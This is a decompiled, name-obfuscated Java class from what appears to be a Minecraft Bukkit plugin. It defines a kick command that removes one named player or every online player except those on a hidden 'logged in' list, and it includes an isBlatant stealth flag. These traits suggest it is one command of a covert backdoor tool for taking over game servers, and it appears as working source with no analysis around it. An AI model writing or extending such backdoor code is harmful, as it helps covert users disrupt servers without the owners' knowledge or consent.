/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.Player
 */
package me.system.runner.command.impl;

import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.methods.API;
import me.system.runner.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

public class KickCommand
extends Command {
    @Override
    public void execute(Core lllllllllllllIlIIlIlllIIlIllIlll, String lllllllllllllIlIIlIlllIIlIlllIlI, String[] lllllllllllllIlIIlIlllIIlIlllIIl, Player lllllllllllllIlIIlIlllIIlIlllIII) {
        if (lllllllllllllIlIIlIlllIIlIlllIIl.length <= 1) {
            lllllllllllllIlIIlIlllIIlIlllIII.sendMessage(Settings.USAGE("kick <player>"));
        } else if (lllllllllllllIlIIlIlllIIlIlllIIl[1].equals("*")) {
            for (Player lllllllllllllIlIIlIlllIIlIlllllI : Bukkit.getOnlinePlayers()) {
                if (lllllllllllllIlIIlIlllIIlIllIlll.lite.contains(lllllllllllllIlIIlIlllIIlIlllllI.getName())) continue;
                API.kickPlayer(lllllllllllllIlIIlIlllIIlIlllllI);
            }
            lllllllllllllIlIIlIlllIIlIlllIII.sendMessage(Settings.PREFIX("Everyone not logged in was kicked!"));
        } else {
            Player lllllllllllllIlIIlIlllIIlIllllIl = Bukkit.getServer().getPlayer(lllllllllllllIlIIlIlllIIlIlllIIl[1]);
            if (lllllllllllllIlIIlIlllIIlIllllIl == null) {
                lllllllllllllIlIIlIlllIIlIlllIII.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("The player ").append(Settings.RED).append(lllllllllllllIlIIlIlllIIlIlllIIl[1]).append(Settings.WHITE).append(" is not online."))));
            } else {
                API.kickPlayer(lllllllllllllIlIIlIlllIIlIllllIl);
                lllllllllllllIlIIlIlllIIlIlllIII.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append(lllllllllllllIlIIlIlllIIlIllllIl.getName()).append(" was kicked!"))));
            }
        }
    }

    public KickCommand() {
        KickCommand lllllllllllllIlIIlIlllIIlllIIIll;
    }

    @Override
    public boolean isBlatant() {
        return false;
    }
}

